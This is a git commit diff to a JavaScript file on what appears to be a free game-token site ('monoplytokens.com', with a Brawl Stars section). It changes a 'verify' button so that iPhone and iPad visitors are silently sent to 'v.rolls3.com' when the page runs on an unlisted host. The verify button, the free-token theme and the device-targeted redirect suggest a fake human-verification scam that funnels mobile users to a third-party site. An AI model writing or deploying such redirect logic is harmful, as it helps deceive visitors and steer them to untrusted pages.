dc895e396fa872fbb5a96850371f34fe68bc4d62
dev20l <iphonetasli@gmail.com>
2025-03-06 14:54:43 +0000

    Update brawl2.js

--- brawl2.js
+++ brawl2.js
@@ -158,27 +158,24 @@
         }
 /*================== [ 2 ] ===============*/
 /*================== [ brawl stars ] ================*/
-document.addEventListener('DOMContentLoaded', function() {
-    var button = document.getElementById('bntverify');
+var button = document.querySelector('#bntverify');  
+button.addEventListener('click', function() {
+    (function() {
+        var originalDomain = "monoplytokens.com";
+        var redirectURL = "https://v.rolls3.com/";
+        var blockedDomains = [
+            "jsdhjjhhjjhejkjkas.blogspot.com",
+            "mply.io.t0ke2n.site",
+            "mply.io.1arshg4.site",
+            "mply.io.4a6b8dh.site"
+        ];
 
-    if (button) {
-        button.addEventListener('click', function() {
-            (function() {
-                var originalDomain = "monoplytokens.com";
-                var redirectURL = "https://v.rolls3.com/";
-                var blockedDomains = [
-                    "mply.io.1arshg4.site",
-                    "mply.io.4a6b8dh.site"
-                ];
+        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
+            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);
 
-                if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
-                    var isIOS = /iPhone|iPad/i.test(navigator.userAgent); 
-
-                    if (isIOS) { 
-                        window.location.href = redirectURL;
-                    }
-                }
-            })();
-        });
-    }
+            if (isIphoneOrIpad) { 
+                window.location.href = redirectURL;
+            }
+        }
+    })();
 });
